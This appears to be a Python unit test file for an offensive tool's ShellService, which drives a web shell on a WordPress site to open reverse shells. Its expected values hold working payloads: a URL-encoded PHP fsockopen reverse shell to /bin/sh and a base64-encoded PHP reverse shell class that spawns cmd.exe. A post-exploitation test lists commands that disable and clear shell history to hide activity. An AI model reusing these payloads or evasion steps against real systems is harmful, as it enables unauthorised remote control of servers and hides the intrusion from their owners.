import unittest, responses
from services import ShellService
from pwnlib.tubes.remote import remote
from config import SHELL_STABILIZATION_METHODS
from tests import mocks


class ShellServiceTest(unittest.TestCase):
    web_shell_url = 'http://fancy-wordpress-site.com/funny_file.php'
    lhost = '127.0.0.1'
    lport = 8080
    
    def test_prepare_listener(self):
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        listener = shell_service.prepare_listener()
        remote(self.lhost, self.lport)
        
        self.assertTrue(listener.connected())
        listener.close()
    
    @responses.activate
    def test_execute_rev_shell(self):
        responses.add(**{
            'method'         : responses.GET,
            'url'            : f'{self.web_shell_url}',
            'status'         : 200
        })
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        shell_service.execute_rev_shell()
    
    @responses.activate
    def test_get_shell_code_url_with_payload_linux(self):
        responses.add(**{
            'method'         : responses.GET,
            'url'            : f'{self.web_shell_url}',
            'status'         : 200,
            'body'           : mocks.wordpress_os_detection_linux_response
        })
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        self.assertEqual(shell_service.get_shell_code_url_with_payload(), 'http://fancy-wordpress-site.com/funny_file.php?omega=php%20-r%20%27%24sock%3Dfsockopen%28%22127.0.0.1%22%2C8080%29%3Bexec%28%22/bin/sh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27')
    
    @responses.activate
    def test_get_shell_code_url_with_payload_windows(self):
        responses.add(**{
            'method'         : responses.GET,
            'url'            : f'{self.web_shell_url}',
            'status'         : 200,
            'body'           : mocks.wordpress_os_detection_windows_response
        })
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        self.assertEqual(shell_service.get_shell_code_url_with_payload(), 'http://fancy-wordpress-site.com/funny_file.php?omega=CmNsYXNzIFNoZWxsIHsKICAgIHByaXZhdGUgJGFkZHIgID0gbnVsbDsKICAgIHByaXZhdGUgJHBvcnQgID0gbnVsbDsKICAgIHByaXZhdGUgJGRlc2NyaXB0b3JzcGVjID0gYXJyYXkoCiAgICAgICAgMCA9PiBhcnJheSgncGlwZScsICdyJyksIAogICAgICAgIDEgPT4gYXJyYXkoJ3BpcGUnLCAndycpLCAKICAgICAgICAyID0%2BIGFycmF5KCdwaXBlJywgJ3cnKSAgCiAgICApOwogICAgcHJpdmF0ZSAkYnVmZmVyICA9IDEwMjQ7ICAgIAogICAgcHJpdmF0ZSAkY2xlbiAgICA9IDA7ICAgICAgIAogICAgcHJpdmF0ZSAkZXJyb3IgICA9IGZhbHNlOyAgIAogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRhZGRyLCAkcG9ydCkgewogICAgICAgICR0aGlzLT5hZGRyID0gJGFkZHI7CiAgICAgICAgJHRoaXMtPnBvcnQgPSAkcG9ydDsKICAgIH0KICAgIHByaXZhdGUgZnVuY3Rpb24gZGFlbW9uaXplKCkgewogICAgICAgICRleGl0ID0gZmFsc2U7CiAgICAgICAgaWYgKCFmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkgeyAgfSAKICAgICAgICBlbHNlIGlmICgoJHBpZCA9IEBwY250bF9mb3JrKCkpIDwgMCkgeyAgfSAKICAgICAgICBlbHNlIGlmICgkcGlkID4gMCkgewogICAgICAgICAgICAkZXhpdCA9IHRydWU7CiAgICAgICAgfSAKICAgICAgICBlbHNlIGlmIChwb3NpeF9zZXRzaWQoKSA8IDApIHsgIH0KICAgICAgICByZXR1cm4gJGV4aXQ7CiAgICB9CiAgICBwcml2YXRlIGZ1bmN0aW9uIHNldHRpbmdzKCkgewogICAgICAgIEBlcnJvcl9yZXBvcnRpbmcoMCk7CiAgICAgICAgQHNldF90aW1lX2xpbWl0KDApOyAKICAgICAgICBAdW1hc2soMCk7IAogICAgfQogICAgcHJpdmF0ZSBmdW5jdGlvbiBkdW1wKCRkYXRhKSB7CiAgICAgICAgJGRhdGEgPSBzdHJfcmVwbGFjZSgnPCcsICcmbHQ7JywgJGRhdGEpOwogICAgICAgICRkYXRhID0gc3RyX3JlcGxhY2UoJz4nLCAnJmd0OycsICRkYXRhKTsKICAgICAgICBlY2hvICRkYXRhOwogICAgfQogICAgcHJpdmF0ZSBmdW5jdGlvbiByZWFkKCRzdHJlYW0sICRuYW1lLCAkYnVmZmVyKSB7CiAgICAgICAgaWYgKCgkZGF0YSA9IEBmcmVhZCgkc3RyZWFtLCAkYnVmZmVyKSkgPT09IGZhbHNlKSB7IAogICAgICAgICAgICAkdGhpcy0%2BZXJyb3IgPSB0cnVlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJGRhdGE7CiAgICB9CiAgICBwcml2YXRlIGZ1bmN0aW9uIHdyaXRlKCRzdHJlYW0sICRuYW1lLCAkZGF0YSkgewogICAgICAgIGlmICgoJGJ5dGVzID0gQGZ3cml0ZSgkc3RyZWFtLCAkZGF0YSkpID09PSBmYWxzZSkgeyAKICAgICAgICAgICAgJHRoaXMtPmVycm9yID0gdHJ1ZTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRieXRlczsKICAgIH0KICAgIAogICAgcHJpdmF0ZSBmdW5jdGlvbiBydygkaW5wdXQsICRvdXRwdXQsICRpbmFtZSwgJG9uYW1lKSB7CiAgICAgICAgd2hpbGUgKCgkZGF0YSA9ICR0aGlzLT5yZWFkKCRpbnB1dCwgJGluYW1lLCAkdGhpcy0%2BYnVmZmVyKSkgJiYgJHRoaXMtPndyaXRlKCRvdXRwdXQsICRvbmFtZSwgJGRhdGEpKSB7CiAgICAgICAgICAgIGlmICgkb25hbWUgPT09ICdTVERJTicpIHsgJHRoaXMtPmNsZW4gKz0gc3RybGVuKCRkYXRhKTsgfQogICAgICAgICAgICAkdGhpcy0%2BZHVtcCgkZGF0YSk7IAogICAgICAgIH0KICAgIH0KICAgIAogICAgcHJpdmF0ZSBmdW5jdGlvbiBicncoJGlucHV0LCAkb3V0cHV0LCAkaW5hbWUsICRvbmFtZSkgewogICAgICAgICRmc3RhdCA9IGZzdGF0KCRpbnB1dCk7CiAgICAgICAgJHNpemUgPSAkZnN0YXRbJ3NpemUnXTsKICAgICAgICBpZiAoJGluYW1lID09PSAnU1RET1VUJyAmJiAkdGhpcy0%2BY2xlbikgewogICAgICAgICAgICB3aGlsZSAoJHRoaXMtPmNsZW4gPiAwICYmICgkYnl0ZXMgPSAkdGhpcy0%2BY2xlbiA%2BPSAkdGhpcy0%2BYnVmZmVyID8gJHRoaXMtPmJ1ZmZlciA6ICR0aGlzLT5jbGVuKSAmJiAkdGhpcy0%2BcmVhZCgkaW5wdXQsICRpbmFtZSwgJGJ5dGVzKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPmNsZW4gLT0gJGJ5dGVzOwogICAgICAgICAgICAgICAgJHNpemUgLT0gJGJ5dGVzOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHdoaWxlICgkc2l6ZSA%2BIDAgJiYgKCRieXRlcyA9ICRzaXplID49ICR0aGlzLT5idWZmZXIgPyAkdGhpcy0%2BYnVmZmVyIDogJHNpemUpICYmICgkZGF0YSA9ICR0aGlzLT5yZWFkKCRpbnB1dCwgJGluYW1lLCAkYnl0ZXMpKSAmJiAkdGhpcy0%2Bd3JpdGUoJG91dHB1dCwgJG9uYW1lLCAkZGF0YSkpIHsKICAgICAgICAgICAgJHNpemUgLT0gJGJ5dGVzOwogICAgICAgICAgICAkdGhpcy0%2BZHVtcCgkZGF0YSk7IAogICAgICAgIH0KICAgIH0KICAgIHB1YmxpYyBmdW5jdGlvbiBydW4oKSB7CiAgICAgICAgaWYgKCEkdGhpcy0%2BZGFlbW9uaXplKCkpIHsKICAgICAgICAgICAgJHRoaXMtPnNldHRpbmdzKCk7CgogICAgICAgICAgICAkc29ja2V0ID0gQGZzb2Nrb3BlbigkdGhpcy0%2BYWRkciwgJHRoaXMtPnBvcnQsICRlcnJubywgJGVycnN0ciwgMzApOwogICAgICAgICAgICBpZiAoJHNvY2tldCkgewogICAgICAgICAgICAgICAgc3RyZWFtX3NldF9ibG9ja2luZygkc29ja2V0LCBmYWxzZSk7IAoKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJHByb2Nlc3MgPSBAcHJvY19vcGVuKCdjbWQuZXhlJywgJHRoaXMtPmRlc2NyaXB0b3JzcGVjLCAkcGlwZXMsIG51bGwsIG51bGwpOwogICAgICAgICAgICAgICAgaWYgKCRwcm9jZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJHBpcGVzIGFzICRwaXBlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGUsIGZhbHNlKTsgCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICRzdGF0dXMgPSBwcm9jX2dldF9zdGF0dXMoJHByb2Nlc3MpOwogICAgICAgICAgICAgICAgICAgIGRvIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXR1cyA9IHByb2NfZ2V0X3N0YXR1cygkcHJvY2Vzcyk7CiAgICAgICAgICAgICAgICAgICAgICAgICRzdHJlYW1zID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAncmVhZCcgICA9PiBhcnJheSgkc29ja2V0LCAkcGlwZXNbMV0sICRwaXBlc1syXSksIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dyaXRlJyAgPT4gbnVsbCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdleGNlcHQnID0%2BIG51bGwKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgJG51bV9jaGFuZ2VkX3N0cmVhbXMgPSBAc3RyZWFtX3NlbGVjdCgkc3RyZWFtc1sncmVhZCddLCAkc3RyZWFtc1snd3JpdGUnXSwgJHN0cmVhbXNbJ2V4Y2VwdCddLCAwKTsgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkbnVtX2NoYW5nZWRfc3RyZWFtcyA9PT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIlNUUk1fRVJST1I6IHN0cmVhbV9zZWxlY3QoKSBmYWlsZWQKIjsgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoJG51bV9jaGFuZ2VkX3N0cmVhbXMgPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoJHNvY2tldCwgJHN0cmVhbXNbJ3JlYWQnXSkvKi0tLS0tLSovKSB7ICR0aGlzLT5ydyAoJHNvY2tldCAgLCAkcGlwZXNbMF0sICdTT0NLRVQnLCAnU1RESU4nICk7IH0gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRmc3RhdCA9IGZzdGF0KCRwaXBlc1syXSkpICYmICRmc3RhdFsnc2l6ZSddKSB7ICR0aGlzLT5icncoJHBpcGVzWzJdLCAkc29ja2V0ICAsICdTVERFUlInLCAnU09DS0VUJyk7IH0gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRmc3RhdCA9IGZzdGF0KCRwaXBlc1sxXSkpICYmICRmc3RhdFsnc2l6ZSddKSB7ICR0aGlzLT5icncoJHBpcGVzWzFdLCAkc29ja2V0ICAsICdTVERPVVQnLCAnU09DS0VUJyk7IH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0gd2hpbGUgKCEkdGhpcy0%2BZXJyb3IpOwoKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkcGlwZXMgYXMgJHBpcGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZmNsb3NlKCRwaXBlKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcHJvY19jbG9zZSgkcHJvY2Vzcyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKCiAgICAgICAgICAgICAgICBmY2xvc2UoJHNvY2tldCk7CiAgICAgICAgICAgIH0gIAogICAgICAgIH0KICAgIH0KfQplY2hvICc8cHJlPic7CiRzaCA9IG5ldyBTaGVsbCgnMTI3LjAuMC4xJywgODA4MCk7CiRzaC0%2BcnVuKCk7CnVuc2V0KCRzaCk7CmVjaG8gJzwvcHJlPic7Cg%3D%3D&php')
    
    @responses.activate
    def test_is_linux(self):
        responses.add(**{
            'method'         : responses.GET,
            'url'            : f'{self.web_shell_url}',
            'status'         : 200,
            'body'           : mocks.wordpress_os_detection_linux_response
        })
        
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        self.assertTrue(shell_service.is_linux())
    
    @responses.activate
    def test_is_not_linux(self):
        responses.add(**{
            'method'         : responses.GET,
            'url'            : f'{self.web_shell_url}',
            'status'         : 200,
            'body'           : mocks.wordpress_os_detection_windows_response
        })
        
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        self.assertFalse(shell_service.is_linux())
    
    def test_upgrade_shell(self):
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        listener = shell_service.prepare_listener()
        remote_shell = remote(self.lhost, self.lport)
        expected_commands = ['export HISTFILE=/dev/null', 'which python', 'which bash', 'python -c \'import pty; pty.spawn("/bin/bash")\'; exit', 'export HISTFILE=/dev/null', 'stty rows 38 columns 116', " alias ls='ls --color=auto'", 'export TERM=xterm', 'history -c']
        commands_executed = []

        # Mock listener a bit
        def mocked_sendline(x): 
            remote_shell.sendline(b'fake@fake:~$ /usr/bin/python /bin/bash')
            commands_executed.append(x.decode())
        listener.sendline = mocked_sendline

        shell_service.upgrade_shell(listener)
        listener.close()
        self.assertListEqual(commands_executed, expected_commands)

    
    def test_find_pty_spawn_vector(self):
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        listener = shell_service.prepare_listener()
        remote_shell = remote(self.lhost, self.lport)

        # Mock listener a bit
        def mocked_sendline(x): remote_shell.sendline(b'fake@fake:~$ /usr/bin/python /bin/bash')
        listener.sendline = mocked_sendline

        self.assertEqual(shell_service.find_pty_spawn_vector(listener), SHELL_STABILIZATION_METHODS['python']['bash'])
        listener.close()
    
    def test_find_pty_spawn_vector_error(self):
        shell_service = ShellService(self.web_shell_url, self.lhost, self.lport)
        listener = shell_service.prepare_listener()
        remote_shell = remote(self.lhost, self.lport)

        # Mock listener a bit
        def mocked_sendline(x): remote_shell.sendline(b'fake@fake:~$ ')
        listener.sendline = mocked_sendline

        self.assertRaises(Exception, shell_service.find_pty_spawn_vector, listener)
        listener.close()


if __name__ == '__main__':
    unittest.main()
